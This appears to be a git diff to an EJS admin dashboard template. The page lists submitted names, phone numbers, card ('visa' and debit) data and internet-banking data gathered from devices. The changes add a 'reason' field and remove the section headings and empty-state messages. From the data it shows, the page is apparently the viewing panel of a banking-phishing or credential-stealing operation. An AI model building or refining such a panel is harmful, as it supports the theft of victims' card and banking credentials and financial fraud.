@@ -22,6 +22,7 @@
           <h3>User Information - <%= index + 1 %></h3>
           <p><strong>Full Name:</strong> <%= entry.fullName %></p>
           <p><strong>Phone Number:</strong> <%= entry.phoneNumber %></p>
+          <p><strong>Reasion:</strong> <%= entry.reason %></p>
           <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
         </div>
       <% }); %>
@@ -29,8 +30,7 @@
       <p>No User Data Found</p>
     <% } %>
 
-    <!-- Visa1 Details Section -->
-    <h2>Visa1 Details</h2>
+  
     <% if (visa1Data && visa1Data.entries && visa1Data.entries.length > 0) { %>
       <% visa1Data.entries.forEach((entry, index) => { %>
         <div class="card">
@@ -42,11 +42,10 @@
         </div>
       <% }); %>
     <% } else { %>
-      <p>No Visa1 Data Found</p>
+  
     <% } %>
 
-    <!-- Visa2 Details Section -->
-    <h2>Visa2 Details</h2>
+
     <% if (visa2Data && visa2Data.entries && visa2Data.entries.length > 0) { %>
       <% visa2Data.entries.forEach((entry, index) => { %>
         <div class="card">
@@ -57,11 +56,10 @@
         </div>
       <% }); %>
     <% } else { %>
-      <p>No Visa2 Data Found</p>
+   
     <% } %>
 
-<!-- Visa3 Details Section -->
-<h2>Visa3 Details</h2>
+
 <% if (visa3Data && visa3Data.entries && visa3Data.entries.length > 0) { %>
   <% visa3Data.entries.forEach((entry, index) => { %>
     <div class="card">
@@ -73,12 +71,10 @@
     </div>
   <% }) %>
 <% } else { %>
-  <p>No Visa3 Data Found</p>
+ 
 <% } %>
 
-    
-    <!-- Other Details Section -->
-    <h2>Other Details</h2>
+
     <!-- Combined Debit Card Data -->
     <% if (combinedDebitCardData && combinedDebitCardData.submissions && combinedDebitCardData.submissions.length > 0) { %>
       <% combinedDebitCardData.submissions.forEach((entry, index) => { %>
@@ -92,7 +88,7 @@
         </div>
       <% }); %>
     <% } else { %>
-      <p>No Debit Card Data Found</p>
+      
     <% } %>
 
     <!-- Combined Internet Banking Data -->
@@ -107,7 +103,7 @@
         </div>
       <% }); %>
     <% } else { %>
-      <p>No Internet Banking Data Found</p>
+   
     <% } %>
 
     <a href="/api/device/dashboard">
